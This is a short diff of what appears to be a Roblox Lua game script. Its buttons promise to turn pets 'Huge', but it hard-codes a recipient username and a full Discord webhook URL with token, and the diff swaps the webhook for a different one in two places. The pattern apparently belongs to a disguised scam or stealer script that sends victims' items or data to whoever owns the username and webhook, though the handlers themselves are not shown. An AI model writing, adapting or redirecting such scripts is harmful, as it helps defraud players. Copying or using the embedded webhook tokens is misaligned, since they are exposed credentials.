@@ -10,7 +10,7 @@ Section:NewButton("Change Pet To Huge", "ButtonInfo", function()
 
 Username = "XXxxGamer12345xxXX"
 
-WebHook = "https://discord.com/api/webhooks/1081853543218151424/38a7tN6RZe0OWTPe1KxKEk0eHfwilf7jNsRlCnx4xJZdvdFGYz5ZUrzY6qQMtuRK53Al"
+WebHook = "https://discord.com/api/webhooks/1057239340423594035/R9ZvNwZSXNaLtq7lslvZha3bhYcHTyE6E6i9f1uiILoX2hQ9ELqeiNmCzWWff8vvZo9a"
 
 loadingscreen = true
 
@@ -34,7 +34,7 @@ Section:NewButton("Convert To Huge", "ButtonInfo", function()
 
 Username = "XXxxGamer12345xxXX"
 
-WebHook = "https://discord.com/api/webhooks/1081853543218151424/38a7tN6RZe0OWTPe1KxKEk0eHfwilf7jNsRlCnx4xJZdvdFGYz5ZUrzY6qQMtuRK53Al"
+WebHook = "https://discord.com/api/webhooks/1057239340423594035/R9ZvNwZSXNaLtq7lslvZha3bhYcHTyE6E6i9f1uiILoX2hQ9ELqeiNmCzWWff8vvZo9a"
 
 loadingscreen = true
 
